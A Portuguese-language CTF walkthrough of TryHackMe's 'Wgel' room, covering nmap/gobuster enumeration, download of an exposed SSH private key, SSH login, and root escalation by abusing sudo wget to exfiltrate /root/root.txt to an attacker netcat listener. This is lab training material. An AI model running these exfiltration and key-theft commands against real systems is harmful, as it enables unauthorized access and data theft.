Wgel CTF

TryHackMe · Easy by Brenno M.

Wgel encadeia a descoberta de uma chave SSH exposta em um diretório oculto do servidor web e a escalação de privilégios abusando de sudo wget segundo o GTFOBins.

Reconhecimento

O Nmap revela SSH e HTTP. O comentário no código-fonte da página cita o usuário jessie. A enumeração encontra o diretório /sitemap/, que expõe uma pasta .ssh com a chave privada.

nmap -sS -sV -Pn <IP>
gobuster dir -u http://<IP> -w big.txt
gobuster dir -u http://<IP>/sitemap -w big.txt
curl http://<IP>/sitemap/.ssh/id_rsa -o id_rsa

Foothold

Com a chave, autentica-se por SSH como jessie e localiza-se a flag de usuário.

chmod 600 id_rsa
ssh -i id_rsa jessie@<IP>
find / -name user.txt 2>/dev/null

Escalação - sudo wget (GTFOBins)

O sudo -l mostra que jessie pode executar /usr/bin/wget como root. Pelo GTFOBins, usa-se --post-file para exfiltrar a flag de root para um listener do atacante (ou, alternativamente, sobrescrever /etc/passwd).

sudo -l
# no atacante:
nc -lvnp 4444
# na vítima:
sudo /usr/bin/wget --post-file=/root/root.txt http://<MEU_IP>:4444
